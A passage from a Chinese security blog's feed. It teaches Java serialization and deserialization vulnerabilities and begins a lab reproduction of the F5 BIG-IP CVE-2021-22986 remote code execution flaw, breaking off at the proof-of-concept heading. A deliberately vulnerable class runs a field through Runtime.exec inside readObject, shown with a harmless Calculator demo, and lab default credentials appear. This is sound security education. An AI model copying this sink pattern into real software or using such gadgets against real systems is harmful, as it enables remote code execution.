获取所有声明的构造方法</span><br>getDeclaredConstructors()<br><span class="hljs-comment">// 获取所有公有的构造方法</span><br>getConstructors()<br><br><span class="hljs-comment">// 获取所有声明的方法</span><br>getDeclaredMethods()<br><span class="hljs-comment">// 获取所有公有的函数</span><br>getMethods()<br></code></pre></td></tr></table></figure><p>代码地址：<a href="https://github.com/yhy0/JavaSerializeDemo">https://github.com/yhy0/JavaSerializeDemo</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初探Java反序列化漏洞(一)</title>
    <link href="/2021/04/16/%E5%88%9D%E6%8E%A2Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E4%B8%80)/"/>
    <url>/2021/04/16/%E5%88%9D%E6%8E%A2Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<blockquote><p>  学无止境，参考着资料边学边记录吧。</p></blockquote><h2 id="0x01-Java序列化与反序列化"><a href="#0x01-Java序列化与反序列化" class="headerlink" title="0x01 Java序列化与反序列化"></a>0x01 Java序列化与反序列化</h2><p><strong>Java序列化</strong>是指把Java对象转换为字节序列的过程。这一过程将数据分解成字节流，以便存储在文件中或在网络上传输；</p><p><strong>Java反序列化</strong>是指把字节序列恢复为Java对象的过程。就是打开字节流并重构成对象，恢复数据。</p><p>序列化与反序列化都可以理解为“写”和“读”操作 ，通过以下这两个方法可以将对象实例进行“序列化”与“反序列化”操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 写入对象内容</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream out)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">// 读取对象内容</span></span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream in)</span></span><br></code></pre></td></tr></table></figure><h2 id="0x02-为什么需要序列化与反序列化"><a href="#0x02-为什么需要序列化与反序列化" class="headerlink" title="0x02 为什么需要序列化与反序列化"></a>0x02 为什么需要序列化与反序列化</h2><p>当两个进程进行远程通信时，可以相互发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。而当两个Java进程进行通信时，可以通过Java的序列化与反序列化在进程之间直接传送对象，换句话说，发送方需要把这个Java对象转换为字节序列，然后在网络上传送；接收方需要从字节序列中恢复出Java对象。</p><p>使用场景：</p><ul><li><p>  想把内存中的对象保存到一个文件中或者数据库中时候；</p></li><li><p>  想用套接字在网络上传送对象的时候；</p></li><li><p>  想通过RMI传输对象的时候</p></li></ul><p>一些应用场景涉及到将对象转化成二进制，序列化保证了能够成功读取到保存的对象。</p><p>总之，序列化的用途就是传递和存储。</p><h2 id="0x03-序列化实现的方式"><a href="#0x03-序列化实现的方式" class="headerlink" title="0x03 序列化实现的方式"></a>0x03 序列化实现的方式</h2><h3 id="3-1-Serializable"><a href="#3-1-Serializable" class="headerlink" title="3.1 Serializable"></a>3.1 Serializable</h3><p>将要序列化的类实现 <code>Serializabel</code> 接口（Serializable接口是一个标记接口，不用实现任何方法。一旦实现了此接口，则表明该类的对象就是可序列化的），而且所有属性必须是可序列化的，就是如果一个可序列化的类的成员不是基本类型，也不是String类型，比如自己自定义的类，那这个引用类型也必须是可序列化的，否则，会导致此类不能序列化(用<code>transient</code>关键字修饰的属性除外，不参与序列化过程) 。</p><p><strong>需要序列化的类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> yhy;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> yhy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2021/4/4 21:46</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@github</span> https://github.com/yhy0</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>序列化</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> yhy;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> yhy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2021/4/4 22:14</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@github</span> https://github.com/yhy0</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-comment">// 序列化和反序列化</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserSerializable</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        User user = <span class="hljs-keyword">new</span> User();<br>        user.setName(<span class="hljs-string">&quot;yhy&quot;</span>);<br><br>        <span class="hljs-comment">// 序列化， 将对象转化为字节序列</span><br>        serialize(user);<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">serialize</span><span class="hljs-params">(User user)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        FileOutputStream fout = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;user.ser&quot;</span>);<br>        ObjectOutputStream out = <span class="hljs-keyword">new</span> ObjectOutputStream(fout);<br>        out.writeObject(user);<br>        out.close();<br>        fout.close();<br>        System.out.println(<span class="hljs-string">&quot;序列化完成.&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到运行后，生产了一个文件，将<code>user</code> 对象变成了可持久化存储的二进制数据。</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210405211458.png" alt="image-20210404222530833"></p><p>可以来看一下该对象序列化后的二进制数据</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210405211505.png" alt="image-20210404223840477"></p><p>序列化的数据流以魔术数字和版本号开头，这个值是在调用<code>ObjectOutputStream</code>序列化时，由<code>writeStreamHeader</code>方法写入。开头的几位一般来当作Java序列化字节的特征。</p><p><strong>反序列化</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> yhy;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> yhy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2021/4/4 22:14</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@github</span> https://github.com/yhy0</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-comment">// 序列化和反序列化</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserSerializable</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        User user = <span class="hljs-keyword">new</span> User();<br>        user.setName(<span class="hljs-string">&quot;yhy&quot;</span>);<br><br>        <span class="hljs-comment">// 序列化， 将对象转化为字节序列</span><br><span class="hljs-comment">//        serialize(user);</span><br>        <span class="hljs-comment">// 反序列化，将字节序列恢复为对象</span><br>        User user1 = unserialize();<br>        System.out.println(user1.getName());<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> User <span class="hljs-title">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        FileInputStream fileIn = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;user.ser&quot;</span>);<br>        ObjectInputStream in = <span class="hljs-keyword">new</span> ObjectInputStream(fileIn);<br>        User user = (User) in.readObject();<br>        in.close();<br>        fileIn.close();<br>        <span class="hljs-keyword">return</span> user;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210405211519.png" alt="image-20210404224748419"></p><p>读取了序列化文件，将二进制文件重新恢复为<code>user</code>对象，对象里面的属性也是完美恢复。</p><h3 id="3-2-Externalizable"><a href="#3-2-Externalizable" class="headerlink" title="3.2 Externalizable"></a>3.2 Externalizable</h3><p>通过实现<code>Externalizable</code>接口进行序列化和反序列胡，但必须实现<code>writeExternal</code>、<code>readExternal</code>方法，并且还要实现一个类的<strong>无参构造方法</strong>，<code>Serializable</code> 接口可以不用实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> yhy;<br><br><span class="hljs-keyword">import</span> java.io.Externalizable;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInput;<br><span class="hljs-keyword">import</span> java.io.ObjectOutput;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> yhy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2021/4/5 00:24</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@github</span> https://github.com/yhy0</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Externalizable</span> </span>&#123;<br><br>    <span class="hljs-comment">// 实现了Externalizable这个接口需要提供无参构造，在反序列化时会检测</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Evil</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-keyword">this</span>.getClass() + <span class="hljs-string">&quot;的EvilClass()无参构造方法被调用!!!!!!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeExternal</span><span class="hljs-params">(ObjectOutput out)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readExternal</span><span class="hljs-params">(ObjectInput in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>     <br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>用法和实现了<code>Serializable</code>接口一样，这里就不演示了。</p><h2 id="0x04-readObject-方法"><a href="#0x04-readObject-方法" class="headerlink" title="0x04 readObject()方法"></a>0x04 readObject()方法</h2><p>特地提到这个方法是因为在反序列化漏洞中它起到了关键作用。因为在序列化过程中，JVM虚拟机会试图调用对象类里的 <code>writeObject</code> 和 <code>readObject</code> 方法，进行用户自定义的序列化和反序列化，如果没有这样的方法，则默认调用是 <code>ObjectOutputStream</code> 的 <code>defaultWriteObject</code> 方法以及 <code>ObjectInputStream</code> 的 <code>defaultReadObject</code> 方法。用户自定义的 <code>writeObject</code> 和 <code>readObject</code> 方法可以允许用户控制序列化的过程，比如可以在序列化的过程中动态改变序列化的数值。 </p><blockquote><p>  Java反序列化的过程中可以自动执行序列化类的四个方法，实现了<code>Serializable</code>接口可以执行的方法包括<code>readObject</code>、<code>readObjectNoData</code>、<code>readResolve</code>，以及实现了<code>Externalizable</code>接口的<code>readExternal</code>方法。这些在找反序列化漏洞时都需要重点关注。</p></blockquote><p>如果<code>readObject</code>方法书写不当的话就有可能引发恶意代码的执行，例如</p><p><strong>基本类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> yhy;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> yhy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2021/4/4 23:34</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@github</span> https://github.com/yhy0</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EvilClass</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;<br>    String name;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">EvilClass</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-keyword">this</span>.getClass() + <span class="hljs-string">&quot;的EvilClass()无参构造方法被调用!!!!!!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">EvilClass</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        System.out.println(<span class="hljs-keyword">this</span>.getClass() + <span class="hljs-string">&quot;的EvilClass(String name)构造方法被调用!!!!!!&quot;</span>);<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-keyword">this</span>.getClass() + <span class="hljs-string">&quot;的getName被调用!!!!!!&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        System.out.println(<span class="hljs-keyword">this</span>.getClass() + <span class="hljs-string">&quot;的setName被调用!!!!!!&quot;</span>);<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-keyword">this</span>.getClass() + <span class="hljs-string">&quot;的toString()被调用!!!!!!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;EvilClass&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + getName() + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">//执行默认的readObject()方法</span><br>        in.defaultReadObject();<br>        System.out.println(<span class="hljs-keyword">this</span>.getClass() + <span class="hljs-string">&quot;的readObject()被调用!!!!!!&quot;</span>);<br>        <span class="hljs-comment">// windows</span><br><span class="hljs-comment">//        Runtime.getRuntime().exec(new String[]&#123;&quot;cmd&quot;, &quot;/c&quot;, name&#125;);</span><br>        <span class="hljs-comment">// mac</span><br>        Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;open&quot;</span>, <span class="hljs-string">&quot;-a&quot;</span>, name&#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>readObject</code>中存在执行命令的代码<code>Runtime.getRuntime().exec(new String[]&#123;&quot;open&quot;, &quot;-a&quot;, name&#125;)</code>，name参数是要执行的命令。那么我们可以构造一个恶意的对象，将其name属性赋值为要执行的命令，当反序列化触发<code>readObject</code>时就会RCE。如下</p><p><strong>序列化和反序列化</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> yhy;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> yhy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2021/4/4 23:36</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@github</span> https://github.com/yhy0</span><br><span class="hljs-comment"> */</span><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EvilSerialize</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        EvilClass evilObj = <span class="hljs-keyword">new</span> EvilClass();<br><span class="hljs-comment">//        evilObj.setName(&quot;calc&quot;);</span><br>        <span class="hljs-comment">// mac</span><br>        evilObj.setName(<span class="hljs-string">&quot;Calculator&quot;</span>);<br><br>        <span class="hljs-comment">// 序列化为字节数组</span><br>        <span class="hljs-keyword">byte</span>[] bytes = serializeToBytes(evilObj);<br><span class="hljs-comment">// 反序列化</span><br>        EvilClass o = (EvilClass)deserializeFromBytes(bytes);<br>        System.out.println(o);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] serializeToBytes(<span class="hljs-keyword">final</span> Object obj) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> ByteArrayOutputStream out = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        <span class="hljs-keyword">final</span> ObjectOutputStream objOut = <span class="hljs-keyword">new</span> ObjectOutputStream(out);<br>        objOut.writeObject(obj);<br>        objOut.flush();<br>        objOut.close();<br>        <span class="hljs-keyword">return</span> out.toByteArray();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">deserializeFromBytes</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-keyword">byte</span>[] serialized)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">final</span> ByteArrayInputStream in = <span class="hljs-keyword">new</span> ByteArrayInputStream(serialized);<br>        <span class="hljs-keyword">final</span> ObjectInputStream objIn = <span class="hljs-keyword">new</span> ObjectInputStream(in);<br>        <span class="hljs-keyword">return</span> objIn.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210405211527.png" alt="image-20210405000541157"></p><p>这是一个极端的例子，在真实场景中，不会有人真的这样直接写一句执行命令的代码在readObject()中，这样写的开发绝对会被拉出去祭天的。所以反序列化漏洞通常会需要Java的一些特性进行配合比如<code>反射(invoke)</code>。然后就是利用链的寻找。反序列化漏洞需要三个东西</p><ol><li> 反序列化入口(source)</li><li> 目标方法(sink)</li><li> 利用链(gadget chain)</li></ol><p>大佬们基本都会去寻找重写了这个<code>readObject</code>方法的类，并配合Java的<code>invoke</code>反射机制，构造利用链，形成了Java中最具特色的反序列化攻击。而且再看上图中的输出结果，不仅仅触发了<code>readObject</code>方法，还触发了<code>toString()</code>、<code>无参构造</code>、<code>set</code>、<code>get</code>方法，那么在实际寻找利用链的过程中就不仅仅需要关注<code>readObject()</code>的方法了。</p><p>代码地址：<a href="https://github.com/yhy0/JavaSerializeDemo">https://github.com/yhy0/JavaSerializeDemo</a></p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p>Java反序列之从萌新到菜鸟 <a href="https://www.kingkk.com/2019/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%B9%8B%E4%BB%8E%E8%90%8C%E6%96%B0%E5%88%B0%E8%8F%9C%E9%B8%9F/">https://www.kingkk.com/2019/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%B9%8B%E4%BB%8E%E8%90%8C%E6%96%B0%E5%88%B0%E8%8F%9C%E9%B8%9F/</a> </p><p>Java反序列化技术分享 <a href="https://github.com/Y4er/WebLogic-Shiro-shell">https://github.com/Y4er/WebLogic-Shiro-shell</a> </p>]]></content>
    
    
    <categories>
      
      <category>漏洞原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞复现-F5 BIG-IP远程代码执行漏洞(CVE-2021-22986)</title>
    <link href="/2021/04/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-F5%20BIG-IP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-22986)/"/>
    <url>/2021/04/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-F5%20BIG-IP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2021-22986)/</url>
    
    <content type="html"><![CDATA[<blockquote><p>  燕子来时新社，梨花落后清明。</p></blockquote><h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。</p><p>CVE-2021-22986 该漏洞允许未经身份验证的攻击者通过BIG-IP管理界面和自身IP地址对iControl REST接口进行网络访问，以执行任意系统命令，创建或删除文件以及禁用服务。</p><h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><table><thead><tr><th align="center">F5 BIG-IP 16.0.0-16.0.1</th><th>F5 BIG-IP 12.1.0-12.1.5.2</th></tr></thead><tbody><tr><td align="center">F5 BIG-IP 15.1.0-15.1.2</td><td>F5 BIG-IQ 7.1.0-7.1.0.2</td></tr><tr><td align="center">F5 BIG-IP 14.1.0-14.1.3.1</td><td>F5 BIG-IQ 7.0.0-7.0.0.1</td></tr><tr><td align="center">F5 BIG-IP 13.1.0-13.1.3.5</td><td>F5 BIG-IQ 6.0.0-6.1.0</td></tr></tbody></table><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p><a href="https://login.f5.com/resource/registerEmail.do">https://login.f5.com/resource/registerEmail.do</a> 注册好后，下载</p><p><a href="https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&amp;pro=big-ip_v16.x&amp;ver=16.0.1&amp;container=16.0.1_Virtual-Edition&amp;path=&amp;file=&amp;B1=I+Accept">https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&amp;pro=big-ip_v16.x&amp;ver=16.0.1&amp;container=16.0.1_Virtual-Edition&amp;path=&amp;file=&amp;B1=I+Accept</a>  选择ova格式的，可以快速使用vm虚拟机打开，安装完后，用户名：root，密码：default，成功登陆后，输入config输入config ，几次回车即可看到当前ip，访问</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210404144019.png" alt="image-20210404113304697"></p><h4 id="3-1-使用POC攻击"><a href="#3-1-使用POC攻击" class="headerlink" title="3.1 使用POC攻击"></a>3.1 